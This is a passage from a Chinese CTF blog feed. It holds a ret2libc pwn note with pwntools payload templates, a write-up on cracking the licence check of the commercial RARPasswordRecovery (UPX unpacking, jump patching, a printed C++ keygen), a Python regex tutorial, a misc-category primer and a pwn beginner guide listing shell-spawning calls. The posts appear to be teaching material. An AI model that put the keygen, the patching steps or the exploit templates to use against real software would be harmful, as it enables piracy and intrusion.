class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * 溢出长度 + p32(puts_plt) + p32(main) +p32(libc_start_main_go)<br><span class="hljs-comment"># io.recvuntil(&#x27;&#x27;)</span><br>io.sendline(payload1)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])     <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;addr:&quot;</span> + <span class="hljs-built_in">hex</span>(libc_start_main_addr))<br></code></pre></td></tr></table></figure><p><strong>对应构造 exp 模式为：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">system_addr = 找到对应 libc 版本后 system 的地址<br>binsh_addr = 找到对饮 libc版本后 /<span class="hljs-built_in">bin</span>/sh 的地址<br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * 溢出长度(需要用 cyclic 重新测试), system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr]) <span class="hljs-comment"># 0xdeadbeef 为 system 地址返回，可以随意设置</span><br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><p>一共需要两次 exp的编写，便可以完成对没有<code>/bin/sh</code>与<code>system</code>的<code>ret2libc</code>题目</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>RARPasswordRecovery 逆向分析</title>
    <link href="/2022/03/14/RARPasswordRecovery%20%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <url>/2022/03/14/RARPasswordRecovery%20%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="Crack-by-混入21的蒟蒻">Crack  by  混入21的蒟蒻</h2><hr><h2 id="暴力破解">暴力破解</h2><p>运行安装包，安装对应的软件，拖入<code>PE</code>进行查壳分析，发现有一个 <code>UPX</code> 壳，直接利用 <code>UPX.exe</code>脱壳</p><p><img src="https://s3.bmp.ovh/imgs/2021/11/5e747896d3964ab7.png" alt=""></p><p>脱去壳后拉入<code>IDA</code>分析</p><p>寻找对应的<code>Register</code>可以发现如下字符串 ：</p><p><img src="https://s3.bmp.ovh/imgs/2021/11/78b9fa1a17f66358.png" alt=""></p><p>寻找对应的<code>The Code you've entered invalid!</code>之后我们利用对应的交叉引用进行查找有关函数而对程序进行分析，可以找到如下函数 ：</p><p><img src="https://static01.imgkr.com/temp/8a9bc7575c154ed4b7d36096d063131d.png" alt=""></p><p><img src="https://s3.bmp.ovh/imgs/2021/11/c035d0e6f8572a68.png" alt=""></p><p>之后跳转到图形界面进行分析 ：</p><p><img src="https://i.bmp.ovh/imgs/2021/11/df848f56ed92542f.png" alt=""></p><p>结合动态调试可以发现这 3 个函数会对程序获取到的密钥进行判断，如果为<code>True</code>则直接跳转到下面的<code>The Code you've entered invalid!</code>此时我们的注册环节就失败了，如果需要跳转到注册成功的界面那么我们需要在每一次的判断中都是<code>False</code>这样我们才能跳转到提示注册成功。</p><p>那么暴力破解这个就变得十分简单了，我们只需要更改对应的<code>jz/jnz</code>这两个跳转使其互换，那么就可以达到我们的目的了。</p><p><img src="https://i.bmp.ovh/imgs/2021/11/7f09bb11d3a1e51e.png" alt=""></p><p>之后我们将补丁打上就完成了对应的注册暴力破解。</p><hr><h2 id="注册机">注册机</h2><h3 id="注册条件判断">注册条件判断</h3><p><img src="https://obohe.com/i/2021/11/21/4udi5.png" alt=""></p><p>在之前暴力破解时我们找到了对应的提示框显示的位置，可以明显的看到有一个<code>if</code>对 4 个表达式进行判断，如果要完成注册机的编写我们则需要让 4 个等式都成立即可，而这个也会是我们编写注册机的关键之处。</p><hr><h4 id="第一个条件">第一个条件</h4><p>我们简单的动态调试一下发现只要第一个判断条件是对输入的数据长度进行判断，如果长度为 0 那么函数就会直接跳转到下面的<code>The Code you've entered invalid!</code>处，也就是意味着在第一个判断处我们仅需要保证输入的长度是大于<code>0</code>的就可以实现跳转到第二个条件中。</p><hr><h4 id="第二个条件">第二个条件</h4><p>通过上图的汇编可以明显地发现有一个<code>test</code>函数，我们需要做的是让<code>test</code>函数的值为 1，也就是<code>eax</code>的值不为空，那么关键就是<code>call</code>里面的函数<code>_wcsstr</code>。我们点击进入该函数，进行分析。</p><img src="https://i.bmp.ovh/imgs/2021/11/3a63b21f8f5bbb79.png" style="zoom: 50%;" /><p>通过图形化的界面我们可以看到程序的大致流程，我们通过输入进行测试，观察具体执行过程。</p><p>我们随意输入一串数字<code>123456789</code>进行测试，在流程中我们会在寄存器经常看到<code>DA</code> ：</p><p>​                                                                               <img src="https://i.bmp.ovh/imgs/2021/11/c3500131c19c76fe.png" alt=""></p><p>经过一轮下来的动调发现，程序会一直在如下区间内一直循环 ：</p><p><img src="https://i.bmp.ovh/imgs/2021/11/187c71a1437aa093.png" alt=""></p><p>如果你常常看寄存器里的值你会发现在寄存器里你输入的值会一个个被<code>pop</code>掉（一直往下寻址），此时我们也通过浏览器查询<code>_wcsstr</code>函数作用企图获得一些灵感，在百度百科中介绍该函数是一个寻找的字符的一个函数 ：</p><p><img src="https://i.bmp.ovh/imgs/2021/11/3e23d6f8e59918a9.png" alt=""></p><p>这或许就解释了在<code>EDI</code>寄存器中为什么我们的输入会一值向下寻址，可能就是在寻找寄存器中出现的<code>DA</code> ？我们更改一下我们的测试密钥更改成<code>DADADADADA</code>，再次对其进行测试。同样的我们在寄存器里会发现当读入我们的一个数据后出现了<code>AOOSOFT-RAR-RECOVERY</code>，感觉是不是有一点熟悉？</p><p>是不是少了一个<code>D</code>，不然就是程序的名字，我们继续按<code>F8</code>测试会发现在寄存器<code>ECX</code>中<code>AOSSOFT-RAR-RECOVERY</code>会变成<code>OSSOFT-RAR-RECOVERY</code>但是继续调试过一个循环会发现又变成成了<code>AOSSOFT-RAR-RECOVERY</code>，但是读入<code>A</code>时又成了<code>OSSOFT-RAR-RECOVERY</code>，我们比那会很疑惑这个密钥是不是与程序的名字<code>DAOSSOFT-RAR-RECOVERY</code>有关系，我们再次改变密钥为<code>DAdsaddasd4152</code>，动调还是会发现<code>ECX</code>中<code>AOSSOFT-RAR-RECOVERY</code>会变成<code>OSSOFT-RAR-RECOVERY</code>但是继续调试读入的数据是<code>d</code>时<code>OSSOFT-RAR-RECOVERY</code>就变回了<code>DA</code>,因此我们确定了输入与密钥的部分关系——密钥开头<code>DAOSSOFT-RAR-RECOVERY</code>。</p><p><img src="https://i.bmp.ovh/imgs/2021/11/775ef29a79e0b9d2.png" alt=""></p><p>至此我们就已经通过了两个条件了。</p><hr><h4 id="第三个条件">第三个条件</h4><p>通过第二个条件时我们可以在寄存器里发现我们的输入会被存储于<code>EAX</code>寄存器中  ：</p><p><img src="https://i.bmp.ovh/imgs/2021/11/a2575782c23cdc67.png" alt=""></p><p>同样的我们回到汇编层去分析程序 ：</p><p><img src="https://i.bmp.ovh/imgs/2021/11/e8cfc242d1760495.png" alt=""></p><p>可以较为明显的看到，函数在第三个条件判断中运行了一次减法和一次右移的操作，我们要想通过，那么就需要保证在第二次测试的输入<code>DAOSSOFT-RAR-RECOVERY</code>保证后面有值进行运算减法和一次右移过后的值不为 0 就可以通过了，例如在<code>DAOSSOFT-RAR-RECOVERY</code>后添加一部分数字或者一部分字母，便可以通过第三个条件。</p><hr><h4 id="第四个条件">第四个条件</h4><p><img src="https://obohe.com/i/2021/11/21/hc1uh0.png" alt=""></p><p>进入第四个条件时，通过汇编可以看到<code>ECX</code>的值等于<code>EBX</code>，同时将<code>ECX</code>入栈，下面有一个<code>Call</code>指令，调用了一个函数，而下面就是<code>test al al</code>，如果我们将鼠标放到<code>al</code>上，你会发现<code>al</code>的值为 0 ，那么意味着如果要进入到<code>if</code>语句内部那么<code>al</code>的只会在<code>call</code>的函数中发生改变，此时我们分析的重点便落到了<code>call sub_417CE0 </code>中。</p><p>进入该函数，我们转换成<code>C的伪代码</code>形式，进行判断该函数的作用。</p><img src="https://obohe.com/i/2021/11/21/hgrz7t.png"  /><p>进入后发现函数里面会有一大堆东西，其中大部分是去掉了函数名称，但是我们仍然可以在其中找到一些东西，<code>wcshr</code>和<code>__InterlockedDecrement</code>两个函数名，经过百度我们可以了解到其相关信息。</p><blockquote><p><strong>wcshr</strong></p><p><img src="https://obohe.com/i/2021/11/21/i6x5y5.png" alt=""></p><p><strong>__InterlockedDecrement</strong></p><p>百度后发现其类似于一种线程锁的东西？防止删除自己，因此我们便不用花费大量时间纠结于下面&gt;的一堆<code>if</code>判断语句中。</p></blockquote><p>通过分析<code>wcshr</code>函数内部有一个<code>Stra</code>和一个<code>0x2Du</code>，通过十六进制我们可以看到<code>0x2Du</code>的值为<code>-</code>，那么那条语句的作用便是在<code>Stra</code>中寻找<code>-</code> 。</p><p><strong>前面是不是还有一些函数，它们的作用会是什么呢 ?</strong></p><p>同样的在动态调试下我们通过单步步入和步出的组合进行观察和判断，并检测<code>Stra</code>的值，当我们动态调试过<code>Stra</code>处时将鼠标放在上面，你会发现<code>Stra</code>的函数值便是我们输入的值，但在经过后面两个函数过后你便会发现<code>Stra</code>变成固定开头后内容了。</p><p>之后便是我们的判断语句<code>if</code>，在判断条件中我们明显的可以看到判断的条件是<code>Stra</code>的长度要大于 3 ，之后再其中寻找<code>-</code>的位置返回给<code>v2</code>，如果寻找到了则会进行<code>v1 = v2 - Stra</code>，我们在动调下不难发现<code>v1</code>的长度便是固定开头后内容的长度减去<code>Stra</code>中带有<code>-</code>后边部分的长度。</p><p>在这个判断中我们需要做的就是让<code>v1</code>的值不为<code>-1</code>和<code>0</code>即可，之后的大多数函数都是不用进行过多的分析。</p><hr><h3 id="注册程序编写">注册程序编写</h3><p>经过上面的分析过后我们便可以成功的进行注册，程序会弹出来恭喜注册成功的提示 ：</p><p>​                                                                 <img src="https://obohe.com/i/2021/11/21/isfzou.png" alt=""></p><p><strong>那么我们注册机应该怎么写呢？</strong></p><p>我们再次简单的整理一下上述密钥的判断过程，可以得知密钥是以<code>DAOSSOFT-RAR-RECOVERY</code>为开头的，之后的输入都要满足之前的条件，要存在有<code>-</code>，使我们的最后一个条件成立——即<code>v1</code>不为<code>-1</code>和<code>0</code>即可。</p><p>分析过后我们便可以开始完成我们的编写，脚本如下。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">string <span class="hljs-title">rand_str</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/*初始化*/</span><br>    string str;                 <span class="hljs-comment">/*声明用来保存随机字符串的str*/</span><br>    <span class="hljs-keyword">char</span> c;                     <span class="hljs-comment">/*声明字符c，用来保存随机生成的字符*/</span><br>    <span class="hljs-keyword">int</span> idx;                    <span class="hljs-comment">/*用来循环的变量*/</span><br>    <span class="hljs-comment">/*循环向字符串中添加随机生成的字符*/</span><br>    <span class="hljs-keyword">for</span>(idx = <span class="hljs-number">0</span>;idx &lt; len;idx ++)<br>    &#123;<br>        <span class="hljs-comment">/*rand()%26是取余，余数为0~25加上&#x27;a&#x27;,就是字母a~z,详见asc码表*/</span><br>        c = <span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-built_in">rand</span>()%<span class="hljs-number">26</span>;<br>        str.<span class="hljs-built_in">push_back</span>(c);       <span class="hljs-comment">/*push_back()是string类尾插函数。这里插入随机字符c*/</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> str;                 <span class="hljs-comment">/*返回生成的随机字符串*/</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>string str1,str2;<br>str1=<span class="hljs-built_in">rand_str</span>(<span class="hljs-number">3</span>);<br>str2=<span class="hljs-built_in">rand_str</span>(<span class="hljs-number">3</span>);<br>cout&lt;&lt;<span class="hljs-string">&quot;您的密钥为：&quot;</span>&lt;&lt;<span class="hljs-string">&quot;DAOSSOFT-RAR-RECOVERY&quot;</span>&lt;&lt;str1&lt;&lt;<span class="hljs-string">&quot;-&quot;</span>&lt;&lt;str2&lt;&lt;endl; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此我们便完成了所有的破解工作。</p><hr><h2 id="魔改">魔改</h2><p>那么对于这个程序我们是否可以魔改呢？</p><p>答案是肯定的。我们分析出来了程序的注册流程，我们便可以对其注册部分进行魔改，也可以对其输入输出的文本框进行修改。</p><h3 id="改变密钥">改变密钥</h3><p>我们根据上面的密钥分析我们可以得到对应的注册密钥是以<code>DAOSSOFT-RAR-RECOVERY</code>为开头的，那我们也可以更改对应的值，使其成为我们独有的加密。</p><p>我们找到<code>DAOSSOFT-RAR-RECOVERY</code>对应所在的位置，进行更改 ：</p><p><img src="https://obohe.com/i/2021/11/21/k5xfdv.png" alt=""></p><p>之后进行测试 ：</p><p><img src="https://obohe.com/i/2021/11/21/k5xids.png" alt=""></p><p>发现同样可以注册成功，完成我们的密钥魔改。</p><h3 id="标题修改">标题修改</h3><p>我们同样的定位对应的数据位置，对其进行更改便可以达到与修改密钥一样的方式完成对应的修改过程，此处就不贴上对应的图了。</p>]]></content>
    
    
    <categories>
      
      <category>Reverse Practice</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Re模块</title>
    <link href="/2022/03/14/Re%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/03/14/Re%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>正则我会写了，怎么在<code>python</code>程序中使用呢？答案便是 re 模块。</p><h2 id="findall">findall</h2><p>findall 查找所有，返回list</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">lst = re.findall(<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;mai le fo len,mai ni mei!&quot;</span>)<br><span class="hljs-built_in">print</span>(lst)<span class="hljs-comment">#[&#x27;m&#x27;,&#x27;m&#x27;,&#x27;m&#x27;]</span><br>lst = re.findall(<span class="hljs-string">r&quot;\d+&quot;</span>,<span class="hljs-string">&quot;5点之前，你要给我5000万&quot;</span>)<br><span class="hljs-built_in">print</span>(lst)<span class="hljs-comment">#[&#x27;5&#x27;,&#x27;5000&#x27;]</span><br></code></pre></td></tr></table></figure><h2 id="Search">Search</h2><p>search 会进行匹配，但是如果匹配到了第一个结果就会返回这个结果。如果匹配不上search返回值为None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = re.search(<span class="hljs-string">r&#x27;\d&#x27;</span>,<span class="hljs-string">&quot;5点之前，你要给我5000万&quot;</span>)<br><span class="hljs-built_in">print</span>(lst)<span class="hljs-comment"># 5</span><br></code></pre></td></tr></table></figure><h2 id="match">match</h2><p>match 只能从字符串的开头进行匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = re.match(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>).group()<br><span class="hljs-built_in">print</span>(ret)<span class="hljs-comment"># a</span><br></code></pre></td></tr></table></figure><h2 id="finditer">finditer</h2><p>finditer 和 findall 差不多，只不过返回的是迭代器（重点）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">it = re.finditer(<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;mai le fo len,mai ni mei!&quot;</span>)<br><span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> it:<br><span class="hljs-built_in">print</span>(el.group()) <span class="hljs-comment"># 依然需要分组</span><br></code></pre></td></tr></table></figure><h2 id="compile">compile</h2><p>compile() 可以将⼀个⻓⻓的正则进⾏预加载. ⽅便后⾯的使⽤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">obj = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d&#123;3&#125;&#x27;</span>) <span class="hljs-comment"># 将正则表达式编译成为</span><br>⼀个 正则表达式对象, 规则要匹配的是<span class="hljs-number">3</span>个数字<br>ret = obj.search(<span class="hljs-string">&#x27;abc123eeee&#x27;</span>) <span class="hljs-comment"># 正则表达式对象调</span><br>⽤search, 参数为待匹配的字符串<br><span class="hljs-built_in">print</span>(ret.group()) <span class="hljs-comment"># 结果: 123</span><br></code></pre></td></tr></table></figure><h2 id="正则中的内容如何单独提取">正则中的内容如何单独提取?</h2><p>单独获取到正则中的具体内容可以给分组起名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div class=&#x27;⻄游记&#x27;&gt;&lt;span id=&#x27;10010&#x27;&gt;中国联通&lt;/span&gt;&lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>obj = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;span id=&#x27;(?P&lt;id&gt;\d+)&#x27;&gt;(?P&lt;name&gt;\w+)&lt;/span&gt;&quot;</span>, re.S)<br>result = obj.search(s)<br><span class="hljs-built_in">print</span>(result.group()) <span class="hljs-comment"># 结果: &lt;span id=&#x27;10010&#x27;&gt;中国联通&lt;/span&gt;</span><br><span class="hljs-built_in">print</span>(result.group(<span class="hljs-string">&quot;id&quot;</span>)) <span class="hljs-comment"># 结果: 10010 # 获取id组的内容</span><br><span class="hljs-built_in">print</span>(result.group(<span class="hljs-string">&quot;name&quot;</span>)) <span class="hljs-comment"># 结果: 中国联通 # 获取name组的内容</span><br></code></pre></td></tr></table></figure><p>这⾥可以看到我们可以通过使⽤分组. 来对正则匹配到的内容进 ⼀步的进⾏筛选</p>]]></content>
    
    
    <categories>
      
      <category>Website Spider</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>misc入门指北(来自于MoeCTF)</title>
    <link href="/2022/03/14/misc/"/>
    <url>/2022/03/14/misc/</url>
    
    <content type="html"><![CDATA[<h2 id="misc是什么？">misc是什么？</h2><blockquote><p>Miscellaneous 简称 MISC，意思是杂项, 混杂的意思。</p></blockquote><ul><li><strong>杂项</strong>，通常涉及<strong>编码解码</strong>、<strong>隐写</strong>、<strong>流量分析</strong>、<strong>电子数据取证</strong>等内容。</li><li>解题过程中会涉及各方面的知识、各种<strong>花式技巧</strong>以及各种各样的工具。</li><li>主要考察选手的<strong>快速理解、快速学习能力</strong>以及各种知识积累的深度、广度。</li></ul><hr><h2 id="misc的分类">misc的分类</h2><ul><li>**编码&amp;解码：**base全家桶、BrainFuck、与佛论禅……</li><li>**隐写：**图片隐写、音频隐写、视频隐写……</li><li>**加解密：**压缩包破解、文档破解、古典密码的加解密……</li><li>**流量分析：**web 流量、usb 流量、蓝牙流量……</li><li>**电子数据取证：**硬盘取证、内存取证……</li></ul><h3 id="编码-解码">编码&amp;解码</h3><blockquote><p><strong>编码</strong>是信息从一种形式或格式<strong>转换为另一种形式</strong>的过程。用预先规定的<strong>方法</strong>将文字、数字或其它对象编成数码。<br><strong>解码</strong>，是编码的<strong>逆过程</strong>。</p></blockquote><h4 id="常用工具">常用工具</h4><ul><li><code>python</code> - <code>base64</code>, <code>libnum</code>, <code>Cryptodome</code></li><li><code>Cybercheif</code></li><li>各种在线工具, e.g. <a href="http://ctf.ssleye.com/">CTF在线工具-CTF工具</a></li><li>搜索引擎, 不认识的编码丢进去搜搜试试</li></ul><h4 id="部分常见编码样例">部分常见编码样例</h4><ul><li><p>Base64 编码</p><p>除base64 之外, base 家族还有: Base16 \ base32 \ Base85</p></li><li><p>Url 编码</p></li><li><p>进制转换编码</p><p>一个很长的二或十或十六进制数字，通过python的libnum库可转成字符串</p></li><li><p>JSfuck \ jother</p><p>本质上都是 JavaScript, 直接浏览器 F12，复制进 console 中回车即可解码</p></li><li><p>brainfuck</p><p>由&gt; &lt; + - . , [ ] 共8种字符构成</p></li><li><p>Unicode</p><p>由“&amp;#”开头，可用来表示汉字、字母、数字，也可由“\u,U+,%u”开头</p></li></ul><h3 id="隐写">隐写</h3><blockquote><p><strong>隐写术</strong>是一门关于<strong>信息隐藏</strong>的技巧与科学, <strong>信息隐藏</strong>指的是不让预期接收者之外的任何人知晓信息的传递或者内容<br>隐写的信息看起来像一些其他的东西, 例如：一张购物清单，一篇文章，一篇图画或者其他“伪装”的消息。</p></blockquote><p>隐写大致可以分为以下几种类型:</p><ul><li>图片隐写: 宽高修改 \ LSB隐写 \ 盲水印 …</li><li>音频隐写: 摩尔斯电码 \ 频谱 \ midi文件 …</li><li>文档隐写: office文件 \ 零宽字符隐写  …</li><li>视频隐写: 帧隐写 \ 视频轨道 \ 字幕 …</li><li>压缩包伪加密</li></ul><h4 id="网络资料">网络资料</h4><ul><li>文件头: <a href="https://zhuanlan.zhihu.com/p/158980459">常见文件文件头</a></li><li>ga1xy师傅的博客: <a href="http://www.ga1axy.top/index.php/archives/4/">Misc相关笔记 - Ga1@xy’s Wor1d</a></li></ul><h4 id="常用工具-2">常用工具</h4><ul><li>linux 系统中的 <code>binwalk</code>, <code>formost</code>, <code>string</code> 等工具</li><li>二进制编辑器, 例如: <code>010 Editor</code>, <code>Ultra Edit</code>, <code>Win Hex</code> 等</li><li>图片隐写工具, 例如: <code>Outguess</code>, <code>Stegsolve</code>, <code>openstego</code>, <code>steghide</code> 等</li><li>一个音频编辑器, 例如: <code>Audacity</code>, <code>Adobe Audition</code> 等</li><li>一个视频编辑器或好用的视频播放器, 例如: <code>Vegas</code>, <code>Potplayer</code>, <code>handbake</code> 等</li><li>用于爆破压缩包的 python 脚本或工具, 后者常见的有: <code>Accent Password Recovery</code>, <code>ARCHPR</code>, <code>john the ripper</code>, <code>hashcat</code> 等</li><li>以及一堆遇到题目时需要在网上找的工具, 换言之, 一个用得惯的搜索引擎 + 这个搜索引擎的高级搜索功能</li></ul><h3 id="流量分析">流量分析</h3><blockquote><p><strong>网络流量分析</strong>是指捕捉网络中流动的数据包，并通过查看包内部数据以及进行相关的协议、 流量分析 、统计等来发现网络运行过程中出现的问题。 CTF比赛中，通常比赛中会提供一个包含流量数据的 <strong>PCAP</strong> 文件，进行分析 。</p></blockquote><h4 id="网络资料-2">网络资料</h4><ul><li><a href="https://www.jianshu.com/p/9b9438dff7a2">图解OSI七层模型 - 简书 (jianshu.com)</a></li><li><a href="https://zhuanlan.zhihu.com/p/92993778">WireShark使用教程 - 知乎 (zhihu.com)</a></li></ul><h4 id="常用工具-3">常用工具</h4><ul><li>wireshark</li><li>python 的 <code>dpkt</code>, <code>pcapy</code>, <code>pyshark</code> 库</li></ul><h3 id="电子数据取证">电子数据取证</h3><blockquote><p>电子数据取证是指能够为法庭接受的、足够可靠和有说服力的、存在于计算机和相关外设中的电子证据的确定、收集、保护、分析、归档以及法庭出示的过程。<br>CTF 中的电子数据取证主要分为硬盘取证和内存取证两部分, 并且只考察对证据文件的分析.</p></blockquote><h4 id="网络资料-3">网络资料</h4><ul><li><a href="https://forensics.xidian.edu.cn/">Xidian Forensics | Home</a></li></ul><h4 id="常用工具-4">常用工具</h4><ul><li>硬盘镜像取证工具 <code>X-ways Forensics</code></li><li>内存镜像取证工具 <code>Volatility</code></li><li>加密容器工具 <code>Veracrypt</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PWN是嘛玩意我该怎么入门(南航入门指北)</title>
    <link href="/2022/03/14/PWN%E6%98%AF%E5%98%9B%E7%8E%A9%E6%84%8F%E6%88%91%E8%AF%A5%E6%80%8E%E4%B9%88%E5%85%A5%E9%97%A8/"/>
    <url>/2022/03/14/PWN%E6%98%AF%E5%98%9B%E7%8E%A9%E6%84%8F%E6%88%91%E8%AF%A5%E6%80%8E%E4%B9%88%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="尽量简洁的简介">尽量简洁的简介</h2><p>pwn写作 屁 达不溜 恩，读作 胖 是指对一个程序输入特定的字符，使得程序执行了一些意料之外的操作，最终拿到系统的shell的过程</p><p>“拿到shell? shell是什么? 为什么要拿? 怎么拿?”</p><p>这个同学问的非常好 具体参考提问的智慧(bushi <strong>关于shell</strong> shell可以就理解为是一个机子的控制权限，或者操作权限</p><p>比如在windows上输入Win + R再输入cmd后回车 会打开一个黑框子——控制台窗口</p><p><img src="https://z3.ax1x.com/2021/09/21/4tABJU.png" alt="img"></p><p>这个黑框就可以称为你Windows的shell</p><p>linux同理Ctrl + Alt +T</p><p><img src="https://z3.ax1x.com/2021/09/21/4tA0iT.png" alt="img"></p><p>在这个黑框里，你可以输入指令来进行文件夹或文件的访问、重命名、删除，ip访问，软件安装，关机，rm -rf /*等等许多你能想到的能用键鼠实现的操作</p><p>实际上用鼠标双击打开一个文件就是将&quot;访问文件夹-访问文件-打开文件&quot;这一系列指令集成进了double click这样一个快捷键里</p><p>有时候这个黑框框能提供比键鼠权限更高的操作</p><p>在做CTF的PWN题时，通常会在你目标机子上放一个名为flag或flag.txt的文件，当我们拿到shell后就可以访问它，得到解题的flag</p><p>因为C/C++的库里面提供了有关系统操作的函数，控制程序执行以下函数之一都可以拿到shell： system(‘/bin/sh’) system(‘sh’) system(‘$0’) execve(‘/bin/sh’,0,0) 应该不止这些(大概)，但再多的我也不知道，差不多够用就是了</p><p>那么怎么强迫程序执行它们呢？这就是我们写PWN题儿时具体要做的事儿</p><p>那我电脑已经有shell了，为啥还要再拿一个shell?</p><p>PWN要拿的不是自己的shell，而是远程其他主机的shell，具体见后面题型那一部分</p><h2 id="前置知识">前置知识</h2><ul><li></li><li><p>C语言</p></li><li><p>C语言的数据类型，数组，选择语句，循环语句，函数，指针</p></li><li><p>最起码给了一个反编译后的代码能看懂是干啥的</p></li><li><p>C语言的教程我也不太了解，就贴个<a href="https://www.runoob.com/cprogramming/c-tutorial.html">菜鸟教程</a>吧</p></li><li></li><li><p>程序在内存中的加载与执行</p></li><li><p>1.变量是怎么储存在内存中的</p></li><li><p>2.数组的储存形式</p></li><li><p>3.字符串的储存形式</p></li><li><p>4.函数调用在内存中的实现</p></li><li><p>5.函数参数的传递过程</p></li><li><p>6.从被调用函数返回&quot;调用者&quot;在内存中的具体过程</p></li><li><p>7.符号解析与静态链接、库文件与动态链接</p></li><li><p>以上都是要会的</p></li><li><p>教程当然也是有的<a href="https://www.icourse163.org/learn/NJU-1001625001?tid=1450235471#/learn/announce">南大袁春风教授 计算机系统基础</a></p></li><li><p>建议在学会C语言函数之后开始学习，要细致地好好学</p></li><li></li><li><p>汇编</p></li><li><p>IA-32和x86-64指令系统大差不差，都要会一点</p></li><li><p>pop,push,call,leave,ret这个几个是比较重要的，要很清楚</p></li><li><p>汇编指令在上面袁春风教授的课里也会详细介绍</p></li><li></li><li><p>Linux基本指令 PWN解题的过程大部分是在Linux系统上完成的，大部分PWN工具也是针对Linux系统开发的，所以了解一点Linux的指令也很必要 这里介绍几个，更多的可以自己百度 ls:显示文件夹下所有文件/文件夹 cd:访问文件夹 cd …:返回上级文件夹 cd …:返回根目录 rm:删除 cp:复制 sudo：sudo一般不单独作为命令，而是作为其他命令前缀，意为 以管理员身份执行</p></li><li></li><li><p>一点点python 漏洞利用的过程基本都是通过写python脚本来实现的，这个脚本又被称为exploit，简称exp python同样还是给<a 